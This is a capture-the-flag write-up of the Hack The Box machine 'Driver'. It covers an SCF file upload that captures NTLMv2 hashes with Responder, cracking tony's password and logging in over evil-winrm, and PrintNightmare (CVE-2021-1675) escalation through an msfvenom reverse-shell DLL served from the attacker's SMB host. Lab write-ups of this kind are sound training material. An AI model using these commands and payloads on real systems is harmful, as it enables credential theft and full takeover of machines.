# Driver

- Target Machine: 10.129.230.91

## Enumeration

### nmap scan

```bash
# Nmap 7.92SVN scan initiated Sun Oct  3 11:59:14 2021 as: nmap -sC -sV -oN nmap/initial 10.129.230.91
Nmap scan report for 10.129.230.91
Host is up (0.068s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
135/tcp open  msrpc        Microsoft Windows RPC
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2021-10-03T16:59:46
|_  start_date: 2021-10-03T16:57:34
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct  3 12:00:24 2021 -- 1 IP address (1 host up) scanned in 70.93 seconds
```

### Website analysis

After opening the website, we get prompted with a login form. Using the credentials admin:admin lets us login.
On the page `http://10.129.230.91/fw_up.php` we can find a file upload form with the message __"Select printer model and upload the respective firmware update to our file share. Our testing team will review the uploads manually and initiates the testing soon."__

We can use a [SCF file attack](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/) to get a valid hash that can be used to login. We can upload a .scf file that will get read by the share, which will then automatically try to access our injected address. All we have to do is catch that access request with responder.py

@payload.scf
```ini
[Shell]
Command=2
IconFile=\\10.10.14.92\share\payload.ico
[Taskbar]
Command=ToggleDesktop
```

```log
[exyss@exyss Responder]$ sudo python Responder.py -wrf --lm -v -I tun0
...

[+] Listening for events...

[SMB] NTLMv2 Client   : 10.129.230.91
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:c13453a23e6db02e:78BDAFD08E253E5746978DF27FD4BF29:0101000000000000DE68E94E7FB8D701E813B01C171EECC600000000020000000000000000000000
[SMB] NTLMv2 Client   : 10.129.230.91
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:743596810fe22acf:0C84F3056F0F1BF105B3FA1C11BB834B:0101000000000000C368084F7FB8D7017B5D4BF64FC8520300000000020000000000000000000000
[SMB] NTLMv2 Client   : 10.129.230.91
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:dab0e3df6707a751:AA012BEC467AD8679108C4447CF5CFCF:0101000000000000AE03254F7FB8D701773274C543415A2B00000000020000000000000000000000
[SMB] NTLMv2 Client   : 10.129.230.91
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:122998ef1f0278d7:7C3D7484EE863F13CD16DD3DEABC5ECE:0101000000000000C29F414F7FB8D701CE4BD154B7B3FAFD00000000020000000000000000000000
[SMB] NTLMv2 Client   : 10.129.230.91
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:4fa10451e78b675c:7B20CD55B4A1B813C83EC901CE8A40CE:0101000000000000973D5E4F7FB8D701A33E0E3E602AEE5500000000020000000000000000000000
[SMB] NTLMv2 Client   : 10.129.230.91
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:c9f4dc0a581ab41d:A646CAEC870EA9106FFDEDC46192E574:0101000000000000F63B7D4F7FB8D70116107EF3BFCA7A6400000000020000000000000000000000
[SMB] NTLMv2 Client   : 10.129.230.91
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:77d6483e9585501a:4ECBBAA35C34043AE73A977BDB557D36:010100000000000043F1994F7FB8D701766ED51CC51FA1E100000000020000000000000000000000
```

We can use JohnTheRipper to crack this hash, finding out that tony's password is `liltony`.
We can use this credentials to access the machine using [evil-winrm](https://github.com/Hackplayers/evil-winrm)

```log
[exyss@exyss evil-winrm]$ bundle exec evil-winrm.rb -i driver.htb -u tony -p liltony

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\tony\Documents> dir
*Evil-WinRM* PS C:\Users\tony\Documents> cd ..   
*Evil-WinRM* PS C:\Users\tony> cd Desktop
*Evil-WinRM* PS C:\Users\tony\Desktop> dir


    Directory: C:\Users\tony\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        10/3/2021   9:58 AM             34 user.txt
```

## Priviledge escalation

By running `Get-Service -Name Spooler`, we can see that this service is running. A famous unpatched Windows CVE is the PrintNightmare exploit (or [CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675)). This vulnerability enables a local user to get admin priviledges in a _very very very easy way_

```log
*Evil-WinRM* PS C:\Users\tony\Downloads> Get-Service -Name Spooler

Status   Name               DisplayName
------   ----               -----------
Running  Spooler            Print Spooler
```

We can setup an SMB server hosting a reverse shell created with msfvenom, which will be retrieved and executed through the CVE.
Once the third try fails, the reverse shell will get triggered, giving us admin access. The root flag can be found in the admin desktop

```bash
# ON THE FIRST TAB
[exyss@exyss CVE-2021-1675]$ msfvenom -f dll -p windows/x64/shell_reverse_tcp LHOST=10.10.14.92 LPORT=443 -o /tmp/revshell.dll

[exyss@exyss CVE-2021-1675]$ sudo smbserver.py smb '/tmp' -smb2support

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

# ON A SECOND TAB

[exyss@exyss evil-winrm]$ sudo msfconsole

msf6 > use exploit/multi/handler/
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
payload => windows/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.10.14.92
lhost => 10.10.14.92
msf6 exploit(multi/handler) > set lport 443
lport => 443
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.92:443 

# ON A THIRD TAB

[exyss@exyss CVE-2021-1675]$ python CVE-2021-1675.py tony:liltony@driver.htb '\\10.10.14.92\smb\revshell.dll'
[*] Connecting to ncacn_np:driver.htb[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\UNIDRV.DLL
[*] Executing \??\UNC\10.10.14.92\smb\revshell.dll
[*] Try 1...
[*] Stage0: 0
[*] Try 2...
[*] Stage0: 0
[*] Try 3...

# AGAIN ON THE SECOND TAB

[*] Command shell session 1 opened (10.10.14.92:443 -> 10.129.230.91:49432) at 2021-10-03 18:22:00 +0200


Shell Banner:
Microsoft Windows [Version 10.0.10240]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32> C:\Users\Administrator\Desktop
C:\Users\Administrator\Desktop> type root.txt
```
